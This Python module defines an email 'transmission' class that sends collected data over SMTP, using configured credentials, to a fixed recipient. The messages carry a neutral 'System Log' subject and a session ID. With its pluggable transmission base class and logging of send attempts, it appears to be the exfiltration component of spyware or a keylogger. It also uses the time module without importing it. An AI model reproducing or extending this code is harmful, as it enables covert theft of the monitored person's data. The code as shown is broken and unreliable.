"""
Email Transmission Module
Sends data via SMTP
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import logging
from .base import BaseTransmission
from config import Config

class EmailTransmission(BaseTransmission):
    def __init__(self):
        super().__init__()
        self.smtp_server = Config.EMAIL_CONFIG['smtp_server']
        self.smtp_port = Config.EMAIL_CONFIG['smtp_port']
        self.email = Config.EMAIL_CONFIG['email']
        self.password = Config.EMAIL_CONFIG['password']
        self.recipient = Config.EMAIL_CONFIG['recipient']
        
        self.method_name = "Email"
    
    def send(self, data):
        """Send data via email"""
        try:
            # Prepare data
            prepared = self.prepare_data(data)
            
            # Create message
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.recipient
            msg['Subject'] = f"System Log - {int(time.time())}"
            
            # Add body
            body = f"""
            System Log Data
            Timestamp: {time.ctime()}
            Session: {Config.SESSION_ID}
            
            {prepared}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
            
            self.log_attempt(True, len(data))
            return True
            
        except Exception as e:
            self.log_attempt(False, 0)
            logging.error(f"Email send failed: {e}")
            return False